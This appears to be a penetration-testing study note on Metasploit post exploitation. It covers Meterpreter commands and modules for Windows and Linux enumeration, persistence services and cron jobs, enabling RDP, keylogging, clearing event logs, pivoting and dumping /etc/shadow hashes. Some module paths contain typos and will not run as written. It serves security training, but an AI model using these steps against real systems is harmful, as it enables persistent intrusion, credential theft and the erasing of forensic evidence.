--- 

## Post Exploitation

+ Post exploitation refers to the actions
performed on the target system after
initial access has been obtained.
+ The post exploitation phase of a
penetration test consists of various
techniques like:
+ Local Enumeration
+ Privilege Escalation
+ Dumping Hashes
+ Establishing Persistence
+ Clearing Your Tracks
+ Pivoting

## Meterpreter

+ The Meterpreter (Meta-Interpreter) payload is an advanced multi-functional
payload that operates via DLL injection and is executed in memory on the target
system, consequently making it difficult to detect.

+ It communicates over a stager socket and provides an attacker with an interactive
command interpreter on the target system that facilitates the execution of system
commands, file system navigation, keylogging and much more.

+ Meterpreter also allows us to load custom script and plugins dynamically.
+ 
+ MSF provides us with various types of meterpreter payloads that can be used
based on the target environment and the OS architecture.

## Windows Post Exploitation Modules

The MSF provides us with various post exploitation modules for both Windows
and Linux.

We can **utilize** these post exploitation modules to enumerate information about
the Windows system we currently have access to:
+ Enumerate user privileges
+ Enumerate logged on users
+ VM check
+ Enumerate installed programs
+ Enumerate AVs
+ Enumerate computers connected to domain
+ Enumerate installed patches
+ Enumerate shares

```bash
msf > use post/windows/gather/enum_logged_on_users 
# enumerate current and recently logged on _Windows_ users.

msf > post/windows/gather/checkvm
#  Gather Virtual Environment Detection

msf > use post/windows/gather/enum_applications
# enumerate all installed applications on a Windows system

msf > use post/windows/gather/enum_av_excluded
# enumerate the file, directory, process and extension-based exclusions from supported AV products, which currently includes Microsoft Defender, Microsoft Security Essentials/Antimalware, and Symantec Endpoint Protection.

msf > use post/windows/gather/enum_computers
# enumerate computers included in the primary Domain

msf > use post/windows/gather/enum_patches
# attempt to enumerate which patches are applied to a _Windows_ system, as well as on which date they were applied

msf > use post/windows/gather/enum_shares
# gather SMB Share Enumeration via Registry 

msf > loot
# returns a list of all _loot_ in the database
```


>**Return to [[04 - Windows Privilege Escalation]] for:**
>   Windows Privilege Escalation: Bypassing UAC
>   Windows Privilege Escalation:Token Impersonation With Incognito
  > Dumping Hashes With Mimikatz
  > Pass-the-Hash With PSExec
  
  `exploit/windows/local/_bypassuac_injection`

## Establishing Persistence On Windows

+ Persistence consists of techniques that adversaries use to **keep access to systems** across restarts, changed credentials, and other interruptions that could cut off their access.

+ Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.

+ We can utilize various post exploitation persistence modules to ensure that we
always have access to the target system.

```bash
msf > use exploit/windows/local/persistence_service
# generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.
# to recive the connection
msf > use multi/handler
  ```
  
## Enabling RDP

+ The Remote Desktop Protocol (RDP) is a proprietary GUI remote access protocol developed by Microsoft and is used to remotely connect and interact with a Windows system.

+ RDP uses TCP port 3389 by default.

+ RDP is disabled by default, however, we can utilize an MSF exploit module to enable RDP on the Windows target and consequently utilize RDP to remotely access to the target system.

+ RDP authentication requires a legitimate user account on the target system as well as the user’s password in clear-text.
``` bash
msf > post/windows/manage/enable_rdp

```

## Windows Keylogging

+ Keylogging is the process of recording or capturing the keystrokes entered on a
target system.
+ This technique is not limited to post exploitation, there are plenty of programs and
USB devices that can be used to capture and transmit the keystrokes entered on a
system.
+ Meterpreter on a Windows system provides us with the ability to capture the
keystrokes entered on a target system and download them back to our local
system.
```bash 
meterpreter > keyscan_start
meterpreter > keyscan_dump
```

## Clearing Windows Event Logs

- The Windows OS stores and catalogs all actions/events performed on the system and stores them in the Windows Event log.

![[Pasted image 20230515162619.png]]

- Event logs are categorized based on the type of events they store:

+ Application logs: Stores application/program events like startups, crashes etc.

+ System logs: Stores system events like startups, reboots etc.

+ Security logs: Stores security events like password changes, authentication failures etc.

+ Event logs can be accessed via the Event Viewer on Windows.

- The event logs are the first stop for any forensic investigator after a compromise has been detected. It is therefore very important to clear your tracks after you are done with your assessment.

``` bash
meterpreter > clearev
```

## Pivoting

+ Pivoting is a post exploitation technique that involves utilizing a compromised host to attack other systems on the compromised host’s private internal network.

+ After gaining access to one host, we can use the compromised host to exploit other hosts on the same internal network to which we could not access previously.

+ Meterpreter provides us with the ability to add a network route to the internal network’s subnet and consequently scan and exploit other systems on the network.

![[Pasted image 20230515143843.png]]
```bash
meterpreter > run autoroute 192.168.25.0/24
msf > use auxiliary/scanner/portscan/tcp
meterpreter > portfwd add -1 1234 -p 80 -r 10.2.27.187
```

## Linux Post Exploitation Modules

The MSF provides us with various post exploitation modules for both Windows
and Linux.

- We can utilize these post exploitation modules to enumerate information about
the Linux system we currently have access to:
+ Enumerate system configuration
+ Enumerate environment variables
+ Enumerate network configuration
+ VM check
+ Enumerate user history

```bash 
msf > use post/linux/gather/enum_configs

msf > use post/multi/gather/env

msf > use post/linux/gather/enum_network

msf > use post/linux/gather/enum_protections

msf > use post/linux/gather/enum_system

msf > use post/linux/gather/checkcontainer

msf > use post/linux/gather/checkvm

msf > use post/linux/gather/enum_users_history

msf > use post/multi/manage/system_session

msf > use post/linux/manage/download_exec

msf > notes
```

## Linux Privilege Escalation

+ The privilege escalation techniques we can utilize will depend on the version of the
Linux kernel running on the target system as well as the distribution release version.
+ MSF offers very little in regards to Linux kernel exploit modules, however, in some
cases, there may be an exploit module that can be utilized to exploit a vulnerable
service or program in order to elevate our privileges.


## Dumping Hashes With Hashdump

+ We can dump Linux user hashes with the hashdump post exploitation module.
Linux password hashes are stored in the /etc/shadow file and can only be
accessed by the root user or a user with root privileges.

+ The hashdump module can be used to dump the user account hashes from the
/etc/shadow file and can also be used to unshadow the hashes for password
cracking with John the Ripper.

## Establishing Persistence On Linux

``` bash
# 1. Create a backdoor and make it as familiar as posible

# 2. Use MSF persistence modules

msf > use explodt/linux/local/apt_package_manager_persistence
msf > use exploit/linux/local/cron_persistence
msf > use exploit/1inux/local/service_persistence
msf > use post/linux/manage/sshkey_persistence
```

## Armitage

+Armitage is a free Java based GUI front-end for the Metasploit Framework
developed by Raphael Mudge and is used to simplify network discovery,
exploitation and post exploitation.

+ Armitage provides you with the following functionality:
+ Visualizes targets
+ Automate port scanning
+ Automate exploitation
+ Automate post exploitation
+ Armitage requires the Metasploit Framework database and the Metasploit backend services to be enabled and running in order to function correctly.
+ Armitage comes pre-packaged with Kali Linux and other penetration testing distributions.